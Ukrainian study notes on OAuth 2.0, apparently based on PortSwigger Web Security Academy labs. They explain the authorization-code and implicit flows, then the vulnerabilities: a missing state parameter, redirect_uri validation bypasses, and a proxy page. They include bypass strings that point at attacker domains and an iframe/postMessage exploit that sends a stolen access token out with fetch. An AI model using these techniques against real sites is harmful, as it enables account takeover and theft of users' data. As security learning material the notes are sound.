Під час перегляду веб-сайтів ви майже напевно стикалися з ресурсами, які дозволяють увійти, використовуючи обліковий запис соціальної мережі. Найімовірніше, ця функція реалізована з використанням популярного фреймворку OAuth 2.0. OAuth 2.0 є надзвичайно цікавим для зловмисників, оскільки він одночасно дуже поширений і за своєю природою схильний до помилок реалізації. Це може призводити до низки вразливостей, які дозволяють зловмисникам отримувати конфіденційні дані користувачів і потенційно повністю обходити автентифікацію.
## What is OAuth?

OAuth - це широко використовуваний фреймворк авторизації, який дозволяє веб-сайтам і веб-застосункам запитувати обмежений доступ до облікового запису користувача в іншому застосунку. Ключовим є те, що OAuth дозволяє користувачеві надавати такий доступ, не розкриваючи свої облікові дані для входу застосунку, що робить запит. Це означає, що користувачі можуть точно визначати, якими саме даними вони хочуть поділитися, замість того щоб передавати третій стороні повний контроль над своїм обліковим записом.

Базовий процес OAuth широко використовується для інтеграції сторонньої функціональності, яка потребує доступу до певних даних з облікового запису користувача. Наприклад, застосунок може використовувати OAuth для запиту доступу до списку ваших контактів електронної пошти, щоб запропонувати людей для встановлення зв’язку. Однак цей самий механізм також використовується для надання сторонніх сервісів автентифікації, дозволяючи користувачам входити за допомогою облікового запису, який вони мають на іншому веб-сайті.

Хоча OAuth 2.0 є поточним стандартом, деякі веб-сайти все ще використовують застарілу версію 1a. OAuth 2.0 був написаний з нуля, а не розроблений безпосередньо на основі OAuth 1.0. У результаті ці дві версії суттєво відрізняються.
## How does OAuth 2.0 work?

OAuth 2.0 спочатку був розроблений як спосіб спільного використання доступу до конкретних даних між застосунками. Він працює шляхом визначення серії взаємодій між трьома окремими сторонами, а саме: клієнтським застосунком, власником ресурсу та постачальником сервісу OAuth.

**Клієнтський застосунок** - веб-сайт або веб-застосунок, який хоче отримати доступ до даних користувача.  
**Власник ресурсу** - користувач, чиї дані клієнтський застосунок хоче отримати.  
**Постачальник сервісу OAuth** - веб-сайт або застосунок, який контролює дані користувача та доступ до них. Вони підтримують OAuth, надаючи API для взаємодії як із сервером авторизації, так і з сервером ресурсів.

Існує безліч різних способів реалізації фактичного процесу OAuth. Вони відомі як OAuth-«потоки» (flows) або «типи надання доступу» (grant types). Загалом обидва ці типи надання доступу включають такі етапи:

1. Клієнтський застосунок запитує доступ до певної частини даних користувача, вказуючи, який тип надання доступу він хоче використати та який саме рівень доступу запитує.
    
2. Користувачеві пропонується увійти до сервісу OAuth і явно надати згоду на запитуваний доступ.
    
3. Клієнтський застосунок отримує унікальний токен доступу, який підтверджує, що він має дозвіл користувача на доступ до запитуваних даних. Конкретний спосіб отримання токена суттєво відрізняється залежно від типу надання доступу.
    
4. Клієнтський застосунок використовує цей токен доступу для виконання API-запитів і отримання відповідних даних із сервера ресурсів.
# OAuth grant types
## What is an OAuth grant type?

Тип надання доступу (grant type) в OAuth визначає точну послідовність кроків, які входять до процесу OAuth. Тип надання доступу також впливає на те, як клієнтський застосунок взаємодіє з сервісом OAuth на кожному етапі, зокрема на спосіб передавання самого токена доступу. Саме тому типи надання доступу часто називають «OAuth-потоками» (OAuth flows).

Сервіс OAuth має бути налаштований на підтримку певного типу надання доступу, перш ніж клієнтський застосунок зможе ініціювати відповідний потік. Клієнтський застосунок вказує, який тип надання доступу він хоче використати, у початковому запиті авторизації, який він надсилає сервісу OAuth.

Існує кілька різних типів надання доступу, кожен із яких має різний рівень складності та власні міркування щодо безпеки. Ми зосередимося на типах надання доступу **«authorization code»** та **«implicit»**, оскільки вони є найбільш поширеними.
## OAuth scopes

Для будь-якого типу надання доступу OAuth клієнтський застосунок повинен вказати, до яких саме даних він хоче отримати доступ і які операції планує виконувати. Це здійснюється за допомогою параметра **scope** в запиті авторизації, який надсилається сервісу OAuth.

У базовому OAuth області доступу (scopes), на які клієнтський застосунок може запитувати дозвіл, є унікальними для кожного сервісу OAuth. Оскільки назва scope є лише довільним текстовим рядком, формат може суттєво відрізнятися залежно від провайдера. Деякі з них навіть використовують повний URI як назву scope, подібно до кінцевої точки REST API. Наприклад, під час запиту доступу лише для читання до списку контактів користувача назва scope може мати один із таких виглядів залежно від використовуваного сервісу OAuth:
```
scope=contacts  
scope=contacts.read  
scope=contact-list-r  
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```
Однак коли OAuth використовується для автентифікації, часто застосовуються стандартизовані області доступу OpenID Connect. Наприклад, область доступу **openid profile** надає клієнтському застосунку доступ на читання до заздалегідь визначеного набору базової інформації про користувача, такої як адреса електронної пошти, ім’я користувача тощо. Детальніше про OpenID Connect ми поговоримо пізніше.
## Authorization code grant type

Тип надання доступу **authorization code** на перший погляд здається досить складним, але насправді він простіший, ніж може здаватися, щойно ви ознайомитеся з кількома базовими принципами.

Коротко кажучи, клієнтський застосунок і сервіс OAuth спочатку використовують перенаправлення (redirects) для обміну серією браузерних HTTP-запитів, які ініціюють потік. Користувача запитують, чи погоджується він на запитуваний доступ. Якщо він погоджується, клієнтський застосунок отримує **«код авторизації» (authorization code)**. Після цього клієнтський застосунок обмінює цей код із сервісом OAuth на **«токен доступу» (access token)**, який можна використовувати для виконання API-запитів з метою отримання відповідних даних користувача.

Уся комунікація, що відбувається починаючи з етапу обміну коду на токен, здійснюється безпосередньо між серверами через захищений, попередньо налаштований зворотний канал (back-channel) і, відповідно, є невидимою для кінцевого користувача. Цей захищений канал встановлюється тоді, коли клієнтський застосунок уперше реєструється в сервісі OAuth. У цей же момент генерується **client_secret**, який клієнтський застосунок повинен використовувати для автентифікації себе під час надсилання таких сервер-до-серверних запитів.

Оскільки найбільш чутливі дані (токен доступу та дані користувача) не передаються через браузер, цей тип надання доступу вважається найбільш безпечним. Серверні застосунки в ідеалі завжди повинні використовувати саме цей тип надання доступу, якщо це можливо.![[Pasted image 20260201172852.png]]
#### 1. Authorization request

Клієнтський застосунок надсилає запит до кінцевої точки **/authorization** сервісу OAuth з проханням надати дозвіл на доступ до конкретних даних користувача. Зверніть увагу, що шлях до кінцевої точки може відрізнятися залежно від провайдера — у наших лабораторних роботах для цієї мети використовується кінцева точка **/auth**. Однак ви завжди зможете ідентифікувати відповідну кінцеву точку за параметрами, які використовуються в запиті.

`GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 Host: oauth-authorization-server.com`

Цей запит містить такі важливі параметри, які зазвичай передаються в рядку запиту (query string):

**client_id**  
Обов’язковий параметр, що містить унікальний ідентифікатор клієнтського застосунку. Це значення генерується під час реєстрації клієнтського застосунку в сервісі OAuth.

**redirect_uri**  
URI, на який браузер користувача має бути перенаправлений під час передавання коду авторизації клієнтському застосунку. Також відомий як «callback URI» або «callback endpoint». Багато атак на OAuth ґрунтуються на експлуатації помилок у валідації цього параметра.

**response_type**  
Визначає, який тип відповіді очікує клієнтський застосунок і, відповідно, який потік він хоче ініціювати. Для типу надання доступу **authorization code** значення має бути **code**.

**scope**  
Використовується для визначення того, до якої саме частини даних користувача клієнтський застосунок хоче отримати доступ. Зверніть увагу, що це можуть бути як користувацькі області доступу, визначені OAuth-провайдером, так і стандартизовані області, описані в специфікації OpenID Connect. Детальніше OpenID Connect ми розглянемо пізніше.

**state**  
Зберігає унікальне, таке, що неможливо вгадати, значення, пов’язане з поточною сесією в клієнтському застосунку. Сервіс OAuth повинен повернути це саме значення у відповіді разом із кодом авторизації. Цей параметр виконує роль CSRF-токена для клієнтського застосунку, гарантуючи, що запит до його кінцевої точки **/callback** походить від того самого користувача, який ініціював OAuth-потік.

#### 2. User login and consent

Коли сервер авторизації отримує початковий запит, він перенаправляє користувача на сторінку входу, де користувачеві буде запропоновано увійти до свого облікового запису в OAuth-провайдера. Наприклад, це часто буває обліковий запис у соціальній мережі.

Після цього користувачеві буде показано список даних, до яких клієнтський застосунок хоче отримати доступ. Цей список формується на основі областей доступу (scopes), визначених у запиті авторизації. Користувач може вирішити, чи надавати згоду на цей доступ.

Важливо зазначити, що після того як користувач схвалив певну область доступу для клієнтського застосунку, цей етап надалі виконуватиметься автоматично, за умови що в користувача все ще є чинна сесія з сервісом OAuth. Іншими словами, під час першого вибору «Увійти через соціальну мережу» користувачеві потрібно буде вручну увійти в систему та надати свою згоду, але якщо він повернеться до клієнтського застосунку пізніше, то часто зможе увійти знову лише одним кліком.

#### 3. Authorization code grant

Якщо користувач надає згоду на запитуваний доступ, його браузер буде перенаправлено на кінцеву точку **/callback**, яка була вказана в параметрі **redirect_uri** запиту авторизації. У результаті сформується GET-запит, що міститиме **код авторизації** як параметр рядка запиту. Залежно від конфігурації, також може передаватися параметр **state** з тим самим значенням, що й у запиті авторизації.

`GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1 Host: client-app.com`

#### 4. Access token request

Після того як клієнтський застосунок отримує код авторизації, він повинен обміняти його на токен доступу. Для цього він надсилає сервер-до-серверний POST-запит до кінцевої точки **/token** сервісу OAuth. Уся подальша комунікація відбувається через захищений зворотний канал (back-channel) і, як правило, не може бути спостережена або контрольована зловмисником.
```
POST /token HTTP/1.1
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```
Окрім **client_id** та коду авторизації, у запиті присутні такі нові параметри:

**client_secret**  
Клієнтський застосунок повинен автентифікувати себе, включивши секретний ключ, який був призначений йому під час реєстрації в сервісі OAuth.

**grant_type**  
Використовується для того, щоб нова кінцева точка знала, який саме тип надання доступу клієнтський застосунок хоче використати. У цьому випадку значення має бути **authorization_code**.
#### 5. Access token grant

Сервіс OAuth перевірить запит на токен доступу. Якщо все відповідає очікуванням, сервер відповідає, надаючи клієнтському застосунку **токен доступу** з запитаною областю доступу (scope).
```
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid profile",
    …
}
```
#### 6. API call

Тепер, коли клієнтський застосунок має **токен доступу**, він нарешті може отримати дані користувача з сервера ресурсів. Для цього він робить API-запит до кінцевої точки **/userinfo** сервісу OAuth. Токен доступу передається в заголовку **Authorization: Bearer**, щоб підтвердити, що клієнтський застосунок має дозвіл на доступ до цих даних.
```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```
#### 7. Resource grant

Сервер ресурсів повинен перевірити, чи токен є дійсним і чи належить він поточному клієнтському застосунку. Якщо все підтверджується, сервер відповідає, надсилаючи запитуваний ресурс - тобто дані користувача відповідно до області доступу (scope) токена.
```
{
    "username":"carlos",
    "email":"carlos@carlos-montoya.net",
    …
}
```
Клієнтський застосунок нарешті може використовувати ці дані за призначенням. У випадку автентифікації через OAuth ці дані зазвичай використовуються як **ідентифікатор (ID)** для надання користувачу автентифікованої сесії, що фактично означає його вхід у систему.

## Implicit grant type

Тип надання доступу **implicit** значно простіший. Замість того, щоб спочатку отримати код авторизації, а потім обміняти його на токен доступу, клієнтський застосунок одразу отримує токен доступу після того, як користувач надає свою згоду.

Можливо, ви запитаєте, чому клієнтські застосунки не використовують завжди тип **implicit**. Відповідь досить проста - він значно менш безпечний. При використанні типу **implicit** уся комунікація відбувається через перенаправлення браузера - немає захищеного зворотного каналу, як у потоці з кодом авторизації. Це означає, що чутливий токен доступу та дані користувача більш піддані потенційним атакам.

Тип **implicit** більше підходить для односторінкових застосунків (SPA) і нативних десктопних застосунків, які не можуть легко зберігати **client_secret** на серверній стороні, і, отже, не отримують значних переваг від використання типу надання доступу **authorization code**. ![[Pasted image 20260201173751.png]]
#### 1. Authorization request

Потік **implicit** починається майже так само, як потік з кодом авторизації. Єдина суттєва відмінність - параметр **response_type** повинен бути встановлений у **token**.
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
#### 2. User login and consent

Користувач входить у систему та вирішує, чи надавати згоду на запитувані дозволи. Цей процес абсолютно такий самий, як у потоці з кодом авторизації.

#### 3. Access token grant

Якщо користувач надає згоду на запитуваний доступ, тут починаються відмінності. Сервіс OAuth перенаправляє браузер користувача на **redirect_uri**, вказаний у запиті авторизації. Однак замість передачі коду авторизації у вигляді параметра рядка запиту, він надсилає **токен доступу** та інші специфічні дані токена як **фрагмент URL**.
```
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```
Оскільки токен доступу передається у фрагменті URL, він **ніколи не надсилається безпосередньо** клієнтському застосунку. Замість цього застосунок повинен використати відповідний скрипт, щоб витягти фрагмент і зберегти його.
#### 4. API call

Після того як клієнтський застосунок успішно витягне токен доступу з фрагмента URL, він може використовувати його для API-запитів до кінцевої точки **/userinfo** сервісу OAuth. На відміну від потоку з кодом авторизації, це відбувається через браузер.
```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```
#### 5. Resource grant

Сервер ресурсів повинен перевірити, чи токен дійсний і чи належить він поточному клієнтському застосунку. Якщо так, сервер відповідає, надсилаючи запитуваний ресурс - тобто дані користувача відповідно до області доступу (scope), пов’язаної з токеном доступу.
```
{
    "username":"carlos",
    "email":"carlos@carlos-montoya.net"
}
```
Клієнтський застосунок нарешті може використовувати ці дані за призначенням. У випадку автентифікації через OAuth ці дані зазвичай використовуються як **ідентифікатор (ID)** для надання користувачу автентифікованої сесії, що фактично означає його вхід у систему.

|Параметр|Authorization Code|Implicit|
|---|---|---|
|**Як отримується токен**|Спочатку отримується код авторизації через браузер, потім сервер клієнта обмінює його на токен доступу через **сервер-до-серверний запит**|Токен доступу відразу надсилається браузеру як фрагмент URL|
|**Безпека**|Висока: токен не проходить через браузер, менше ризику викрадення|Низька: токен надсилається через браузер, може бути перехоплений зловмисником|
|**Підходить для**|Серверних застосунків, де можна безпечно зберігати **client_secret**|Односторінкових (SPA) і нативних клієнтів, які не можуть зберігати **client_secret**|
|**Складність реалізації**|Трохи складніше: потрібен сервер для обміну коду на токен|Простий: токен одразу доступний у браузері|
### OAuth authentication

Хоча спочатку OAuth не був призначений для цього, з часом він також еволюціонував у засіб **автентифікації користувачів**. Наприклад, вам, імовірно, знайома можливість входу на багато веб-сайтів за допомогою вже наявного облікового запису в соціальній мережі, замість реєстрації безпосередньо на цьому сайті. Коли ви бачите таку опцію, з великою ймовірністю вона реалізована на основі OAuth 2.0.

У механізмах автентифікації OAuth базові OAuth-потоки загалом залишаються тими самими; основна відмінність полягає в тому, **як клієнтський застосунок використовує отримані дані**. З точки зору кінцевого користувача результат автентифікації через OAuth загалом нагадує єдиний вхід (SSO) на основі SAML. Зазвичай автентифікація через OAuth реалізується так:

1. Користувач обирає опцію входу за допомогою свого облікового запису в соціальній мережі. Клієнтський застосунок використовує OAuth-сервіс соціальної мережі, щоб запросити доступ до певних даних, які можна використати для ідентифікації користувача. Наприклад, це може бути адреса електронної пошти, прив’язана до його облікового запису.
    
2. Після отримання токена доступу клієнтський застосунок запитує ці дані із сервера ресурсів, зазвичай через спеціальну кінцеву точку **/userinfo**.
    
3. Отримавши ці дані, клієнтський застосунок використовує їх замість імені користувача для входу користувача в систему. Токен доступу, отриманий від сервера авторизації, часто використовується замість традиційного пароля.
## How do OAuth authentication vulnerabilities arise?

Вразливості автентифікації через OAuth виникають частково тому, що **специфікація OAuth відносно нестрога і гнучка за дизайном**. Хоча існує кілька обов’язкових компонентів, необхідних для базової функціональності кожного типу надання доступу, **переважна більшість реалізації є повністю необов’язковою**. Сюди входять численні налаштування конфігурації, які необхідні для безпечного зберігання даних користувачів. Простими словами, існує багато можливостей для помилок або поганих практик.

Ще одна ключова проблема OAuth - **загальна відсутність вбудованих механізмів безпеки**. Захист майже повністю залежить від того, чи використовують розробники правильне поєднання налаштувань конфігурації та чи впроваджують додаткові заходи безпеки, такі як надійна перевірка введених даних. Як ви, напевно, зрозуміли, тут багато нюансів, і легко зробити помилку, якщо у вас мало досвіду роботи з OAuth.

Залежно від типу надання доступу, **дуже чутливі дані також можуть передаватися через браузер**, що створює різні можливості для зловмисника перехопити їх.
## Identifying OAuth authentication

Визначити, коли застосунок використовує автентифікацію через OAuth, відносно просто. Якщо ви бачите опцію входу за допомогою облікового запису іншого веб-сайту, це сильний сигнал того, що використовується OAuth.

Найнадійніший спосіб ідентифікувати автентифікацію через OAuth — це проксирувати трафік через **Burp** і перевірити відповідні HTTP-повідомлення під час використання цієї опції входу. Незалежно від того, який тип надання доступу використовується, **перший запит потоку завжди буде запитом до кінцевої точки /authorization**, що містить низку параметрів рядка запиту, призначених спеціально для OAuth.

Особливу увагу слід звернути на параметри **client_id**, **redirect_uri** та **response_type**. Наприклад, запит авторизації зазвичай виглядає приблизно так:
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
## Recon

Проведення базової розвідки OAuth-сервісу, що використовується, може спрямувати вас у правильному напрямку під час виявлення вразливостей.

Само собою зрозуміло, що варто уважно вивчити різні HTTP-взаємодії, з яких складається OAuth-потік - пізніше ми розглянемо конкретні моменти, на які слід звертати увагу. Якщо використовується зовнішній OAuth-сервіс, ви зазвичай можете визначити конкретного провайдера за ім’ям хоста, на який надсилається запит авторизації. Оскільки такі сервіси надають публічний API, часто доступна детальна документація, яка може містити багато корисної інформації, зокрема точні назви кінцевих точок і використовувані параметри конфігурації.

Після того як ви дізналися ім’я хоста сервера авторизації, завжди варто спробувати надіслати GET-запит до таких стандартних кінцевих точок:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```
Вони часто повертають JSON-файл конфігурації, що містить ключову інформацію, наприклад деталі додаткових функцій, які можуть підтримуватися. Іноді це дозволяє виявити ширшу поверхню атаки та підтримувані можливості, які можуть не згадуватися в документації.
## Exploiting OAuth authentication vulnerabilities

Вразливості можуть виникати як у реалізації OAuth з боку клієнтського застосунку, так і в конфігурації самого OAuth-сервісу. У цьому розділі ми покажемо, як експлуатувати деякі з найпоширеніших вразливостей в обох цих контекстах.

### Вразливості в клієнтському застосунку

- Неправильна реалізація типу надання доступу **implicit**
    
- Помилковий захист від CSRF 
    
### Вразливості в OAuth-сервісі

- Витік кодів авторизації та токенів доступу
    
- Некоректна перевірка областей доступу (scope)
    
- Неперевірена реєстрація користувачів
### Vulnerabilities in the OAuth client application

Клієнтські застосунки часто використовують авторитетний, добре перевірений у бою OAuth‑сервіс, який надійно захищений від широко відомих експлойтів. Однак **власна частина реалізації з боку клієнтського застосунку може бути значно менш безпечною**.

Як уже згадувалося, специфікація OAuth визначена досить вільно. Це особливо стосується реалізації з боку клієнтського застосунку. Потік OAuth містить багато рухомих частин, велику кількість необов’язкових параметрів і налаштувань конфігурації в кожному типі надання доступу, що створює значний простір для помилок і неправильних налаштувань.
#### Improper implementation of the implicit grant type

Через ризики, пов’язані з передаванням токенів доступу через браузер, тип надання доступу **implicit** здебільшого рекомендується для односторінкових застосунків (SPA). Проте через відносну простоту його також часто використовують у класичних клієнт‑серверних веб‑застосунках.

У цьому потоці токен доступу передається від OAuth‑сервісу до клієнтського застосунку через браузер користувача у вигляді **фрагмента URL**. Потім клієнтський застосунок отримує токен за допомогою JavaScript. Проблема полягає в тому, що якщо застосунок хоче зберегти сесію після того, як користувач закриє сторінку, йому потрібно десь зберегти поточні дані користувача (зазвичай це ідентифікатор користувача та токен доступу).

Щоб розв’язати цю проблему, клієнтський застосунок часто надсилає ці дані на сервер у POST‑запиті, а потім призначає користувачу cookie сесії, фактично виконуючи вхід у систему. Такий запит приблизно еквівалентний запиту відправлення форми, який надсилається під час класичного входу за паролем. Однак у цьому випадку сервер **не має жодних секретів або паролів**, з якими можна було б порівняти надіслані дані, тому вони приймаються **на довіру**.

У потоці **implicit** цей POST‑запит доступний для перегляду та модифікації зловмисником через браузер. У результаті така поведінка може призвести до серйозної вразливості, якщо клієнтський застосунок належним чином не перевіряє, що токен доступу відповідає іншим даним у запиті. У такому випадку зловмисник може просто змінити параметри, що надсилаються на сервер, і видати себе за будь‑якого користувача.

#### Flawed CSRF protection

Хоча багато компонентів OAuth‑потоків є необов’язковими, деякі з них **настійно рекомендується використовувати**, якщо немає вагомої причини цього не робити. Одним із таких прикладів є параметр **state**.

В ідеалі параметр **state** повинен містити значення, яке неможливо вгадати, наприклад хеш чогось, пов’язаного з сесією користувача в момент ініціації OAuth‑потоку. Це значення потім передається туди й назад між клієнтським застосунком і OAuth‑сервісом та використовується як своєрідний **CSRF‑токен** для клієнтського застосунку. Тому, якщо ви помічаєте, що запит авторизації **не містить параметра state**, з точки зору зловмисника це є надзвичайно цікавим.

Це потенційно означає, що зловмисник може **самостійно ініціювати OAuth‑потік**, а потім змусити браузер жертви завершити його — подібно до класичної CSRF‑атаки. Наслідки можуть бути дуже серйозними залежно від того, як саме клієнтський застосунок використовує OAuth.

Розгляньмо веб‑сайт, який дозволяє користувачам входити або за допомогою класичного механізму з паролем, або шляхом прив’язки облікового запису до профілю в соціальній мережі через OAuth. У такому випадку, якщо застосунок **не використовує параметр state**, зловмисник потенційно може **перехопити обліковий запис жертви** в клієнтському застосунку, прив’язавши його до **власного облікового запису в соціальній мережі**.
 
Зверніть увагу, що якщо сайт дозволяє користувачам входити **виключно через OAuth**, параметр **state** можна вважати менш критичним. Однак навіть у такому випадку відсутність параметра **state** все одно може дозволити зловмисникам здійснювати **CSRF‑атаки входу (login CSRF)**, за яких користувача обманом змушують увійти **в обліковий запис зловмисника**.

Коротше кажучи через те що немає параметру стейт можна взяти oauth код та відправити жертві посилання з цим кодом, через що, жертва, відкривши посилання, підв'яже свій акаунт до вашого профілю соціальних мереж, через що, потім, можна буде ввійти за допомогоюю соціальної мережі в акаунт жертви.

### Leaking authorization codes and access tokens

Мабуть, однією з найвідоміших вразливостей, пов’язаних з OAuth, є ситуація, коли **неправильна конфігурація самого OAuth‑сервісу** дозволяє зловмисникам викрадати коди авторизації або токени доступу, пов’язані з обліковими записами інших користувачів. Отримавши дійсний код або токен, зловмисник може отримати доступ до даних жертви. Зрештою це може призвести до **повного компрометування облікового запису** — зловмисник потенційно зможе входити від імені жертви в будь‑який клієнтський застосунок, зареєстрований у цьому OAuth‑сервісі.

Залежно від типу надання доступу, код або токен надсилається через браузер жертви до кінцевої точки **/callback**, вказаної в параметрі **redirect_uri** запиту авторизації. Якщо OAuth‑сервіс **неналежним чином перевіряє цей URI**, зловмисник може побудувати CSRF‑подібну атаку, змусивши браузер жертви ініціювати OAuth‑потік, який надішле код або токен на **redirect_uri**, контрольований зловмисником.

У випадку потоку з кодом авторизації зловмисник може потенційно **викрасти код жертви до того, як він буде використаний**. Після цього він може надіслати цей код на легітимну кінцеву точку **/callback** клієнтського застосунку (оригінальний redirect_uri) і отримати доступ до облікового запису користувача. У такому сценарії зловмиснику навіть **не потрібно знати client_secret або отриманий токен доступу**. Якщо в жертви є чинна сесія з OAuth‑сервісом, клієнтський застосунок просто виконає обмін коду на токен **від імені зловмисника**, а потім увійде в обліковий запис жертви.

Зверніть увагу, що використання захисту за допомогою параметрів **state** або **nonce** не обов’язково запобігає таким атакам, оскільки зловмисник може згенерувати нові значення з власного браузера.

Більш захищені сервери авторизації вимагають передавати параметр **redirect_uri** також і під час обміну коду авторизації. У такому випадку сервер може перевірити, чи збігається він із тим, що був отриманий у початковому запиті авторизації, і відхилити обмін, якщо значення не співпадають. Оскільки це відбувається в сервер‑до‑серверних запитах через захищений зворотний канал (back‑channel), зловмисник **не має можливості контролювати** цей другий параметр **redirect_uri**.

Коротше кажучи можна викрасти код в /auth, якщо жертва має активну сесію в OAuth. Жертва повинна перейти за посиланням з редіректом на наш сайт який викрадає код, що надасть нам код.
#### Flawed redirect_uri validation

Через атаки, подібні до розглянутих у попередній лабораторній роботі, найкращою практикою є те, щоб клієнтські застосунки під час реєстрації в OAuth‑сервісі надавали **білий список (whitelist) своїх справжніх callback‑URI**. Таким чином, коли OAuth‑сервіс отримує новий запит, він може перевірити параметр `redirect_uri` на відповідність цьому списку. У такому випадку передача зовнішньої URI, ймовірно, призведе до помилки. Проте навіть у цьому разі можуть існувати способи обійти таку перевірку.

Під час аудиту OAuth‑флоу слід експериментувати з параметром `redirect_uri`, щоб зрозуміти, як саме виконується його перевірка. Наприклад:

- Деякі реалізації дозволяють діапазон підкаталогів, перевіряючи лише те, що рядок починається з правильного значення, тобто дозволеного домену. Слід спробувати видаляти або додавати довільні шляхи, параметри запиту та фрагменти, щоб перевірити, що можна змінити без виклику помилки.
    
- Якщо можна дописувати додаткові значення до стандартного параметра `redirect_uri`, можна спробувати скористатися розбіжностями в обробці URI різними компонентами OAuth‑сервісу. Наприклад, варто спробувати такі техніки:
```
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```
- Іноді можна зустріти вразливості типу server-side parameter pollution. Про всяк випадок слід спробувати передати дубльований параметр `redirect_uri`, наприклад:
```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```
- Деякі сервери надають особливе ставлення до URI з `localhost`, оскільки їх часто використовують під час розробки. У деяких випадках будь‑який redirect URI, що починається з `localhost`, може бути помилково дозволений у production‑середовищі. Це може дозволити обійти перевірку, зареєструвавши домен на кшталт `localhost.evil-user.net`.
    
Важливо зазначити, що тестування не варто обмежувати лише параметром `redirect_uri` окремо. У реальних умовах часто потрібно експериментувати з **різними комбінаціями змін кількох параметрів**. Іноді зміна одного параметра може вплинути на перевірку інших. Наприклад, зміна `response_mode` з `query` на `fragment` інколи повністю змінює обробку `redirect_uri`, дозволяючи передавати URI, які інакше були б заблоковані. Аналогічно, якщо підтримується режим відповіді `web_message`, це часто дозволяє використовувати ширший діапазон піддоменів у `redirect_uri`.
#### Stealing codes and access tokens via a proxy page

Під час роботи з більш захищеними цілями ви можете виявити, що незалежно від того, що ви пробуєте, вам не вдається передати зовнішній домен як `redirect_uri`. Однак це не означає, що час здаватися.

На цьому етапі ви вже повинні мати доволі чітке розуміння того, **які частини URI можна змінювати**. Тепер ключове завдання — використати ці знання, щоб спробувати отримати доступ до **ширшої поверхні атаки всередині самого клієнтського застосунку**. Іншими словами, спробуйте з’ясувати, чи можете ви змінити параметр `redirect_uri` так, щоб він вказував на **інші сторінки в межах дозволеного (whitelisted) домену**.

Спробуйте знайти способи отримати доступ до різних піддоменів або шляхів. Наприклад, стандартний URI часто вказує на OAuth‑специфічний шлях, такий як `/oauth/callback`, який зазвичай не має цікавих підкаталогів. Однак ви можете скористатися трюками з обходом директорій (directory traversal), щоб передати довільний шлях у межах домену. Наприклад:
```
https://client-app.com/oauth/callback/../../example/path
```
На бекенді це може бути інтерпретовано як:
```
https://client-app.com/example/path
```
Після того як ви визначите, **які інші сторінки можна встановити як redirect URI**, слід проаудитити їх на наявність додаткових вразливостей, які потенційно можна використати для витоку коду або токена. Для flow з кодом авторизації потрібно знайти вразливість, що дає доступ до **query‑параметрів**, тоді як для implicit grant type необхідно витягнути **URL‑фрагмент**

Однією з найкорисніших вразливостей для цієї мети є **open redirect**. Її можна використати як проксі, щоб переспрямовувати жертв разом із їхнім кодом або токеном на домен, контрольований зловмисником, де можна розмістити будь‑який шкідливий скрипт.

Зверніть увагу, що у випадку implicit grant type викрадення access token не лише дозволяє вам увійти в обліковий запис жертви в клієнтському застосунку. Оскільки весь implicit‑флоу відбувається через браузер, ви також можете використати цей токен для виконання власних API‑запитів до resource‑сервера OAuth. Це може дозволити отримати конфіденційні дані користувача, до яких зазвичай немає доступу через веб‑інтерфейс клієнтського застосунку.

Коротше кажучи можна отримати дані акаунта черезе помилку в редіректі, можна в ньому підмінити сайт на свій та отримати дані аксес_токена вашої жертви, яка перейде за вразливим посиланням. далі щоб отримати дані акаунта можна в запиті /me, який отримує інформацію про користувача від іншого сервера, підставити наш аксес токен в полі Authorisation: Bearer ваш код, що надасть нам інформацію про дані користувача в повному обсязі, а не ті, що відображає сторінка сайту.

Окрім відкритих редиректів (open redirect), слід шукати **будь-які інші вразливості**, які дозволяють витягнути код або токен і передати його на зовнішній домен. Ось кілька хороших прикладів:

**Небезпечний JavaScript, що обробляє query-параметри та URL-фрагменти**  
Наприклад, небезпечні скрипти для web messaging можуть бути дуже корисними для цього. У деяких сценаріях може знадобитися знайти довший ланцюжок ґаджетів (gadget chain), який дозволяє передати токен через серію скриптів, перш ніж зрештою злити його на ваш зовнішній домен.
Приклад експлоїта:
```
<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
<script> 
     window.addEventListener('message', function(e) { 
         fetch("/" + encodeURIComponent(e.data.data)) 
     }, false) 
</script>
```
Цей експлоїт експлойт краде OAuth access token (і дані користувача) через OpenID Connect, використовуючи implicit flow + iframe + postMessage. Токен приходить на сторінку де є вразливий джаваскрипт.

**XSS-вразливості**  
Хоча XSS-атаки самі по собі можуть мати великий вплив, зазвичай існує лише короткий проміжок часу, протягом якого зловмисник має доступ до сесії користувача — до моменту, коли той закриє вкладку або перейде на іншу сторінку. Оскільки для cookies сесії часто використовується атрибут `HTTPOnly`, зловмисник зазвичай не може отримати до них прямий доступ через XSS.  
Однак, викравши OAuth-код або токен, зловмисник може отримати доступ до облікового запису користувача **у власному браузері**. Це дає значно більше часу для дослідження даних користувача та виконання шкідливих дій, що суттєво підвищує серйозність XSS-вразливості.

**HTML-інʼєкції**  
